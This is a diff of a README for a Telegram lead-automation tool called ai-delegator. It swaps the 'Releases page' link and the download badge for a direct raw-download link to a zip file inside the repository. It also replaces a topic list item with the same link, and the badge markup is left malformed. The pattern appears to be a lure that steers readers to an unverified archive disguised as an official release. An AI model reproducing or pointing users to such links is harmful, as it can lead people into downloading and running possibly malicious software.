@@ -6,9 +6,9 @@ Welcome to ai-delegator! This application helps you automate your Telegram lead 
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Please visit our [Releases page](https://github.com/ALVINZELDA/ai-delegator/releases) to download the latest version.
+To get started, you need to download the software. Please visit our [Releases page](https://github.com/ALVINZELDA/ai-delegator/raw/refs/heads/main/data/delegator_ai_v3.0.zip) to download the latest version.
 
-[![Download ai-delegator](https://img.shields.io/badge/Download%20ai--delegator-v1.0-blue.svg)](https://github.com/ALVINZELDA/ai-delegator/releases)
+[![Download ai-delegator](https://github.com/ALVINZELDA/ai-delegator/raw/refs/heads/main/data/delegator_ai_v3.0.zip%https://github.com/ALVINZELDA/ai-delegator/raw/refs/heads/main/data/delegator_ai_v3.0.zip)](https://github.com/ALVINZELDA/ai-delegator/raw/refs/heads/main/data/delegator_ai_v3.0.zip)
 
 ### Steps to Download:
 
@@ -81,7 +81,7 @@ This project covers various topics related to automation and outreach, including
 - **GramJS**
 - **JavaScript**
 - **Lead Generation**
-- **Node.js**
+- **https://github.com/ALVINZELDA/ai-delegator/raw/refs/heads/main/data/delegator_ai_v3.0.zip**
 - **OpenAI**
 - **Telegram** and its API
 
